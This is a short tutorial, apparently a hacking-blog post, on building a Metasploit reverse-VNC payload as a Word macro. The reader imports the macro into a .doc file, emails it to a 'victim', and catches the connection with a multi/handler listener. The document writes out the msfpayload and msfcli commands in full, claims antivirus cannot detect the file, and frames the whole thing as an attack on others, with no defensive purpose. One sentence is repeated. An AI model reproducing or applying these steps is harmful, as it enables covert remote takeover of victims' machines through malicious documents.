@@ -1,0 +1,30 @@
+Today i will show u how to use Metasploit payload feature for Reverse VNC connection which can be hidden in a Word file and get VNC desktop of the remote user
+
+Metasploit will create a macro for Word, which once implemented when a user opens the word file we get a reverse VNC of the target system ,where the Word file contains the macro, even antvirus cant detect It,
+
+there is no required of VNC installed in the Victim PC
+u can also do this in WAN also only thing is u should port forward ur 4444 port in ur modem or router
+
+Lets begin
+
+1) Create a Macro to Intergate with word
+
+./msfpayload windows/vncinject/reverse_tcp LHOST=192.168.147.128 V > /tmp/punter.bas
+
+2) copy that punter.bas file in windows now go to windows
+and open ur office 2003 –>tools–>macro–>visualbasic editor
+then go to File–>import file–> and choose the punter.bas and save it with a name ex: macrogame.doc
+now send this file to victim via mail or some other technique for this demo i will open in my system
+
+3)now in Backtrack type this command
+
+./msfcli multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=192.168.147.128 DisableCourtesyShell=True E
+
+When the target on the windows open the file, it will be asked if he/she wished to accept or not run the macro, if it accepts, the connection will be initiated, and the VNC client will open on the post BackTrack.
+not run the macro, if it accepts, the connection will be initiated, and the VNC client will open on the post BackTrack.
+
+Video link for the above guide
+
+http://blip.tv/file/1847504
+
+http://wirelesspunter.blip.tv
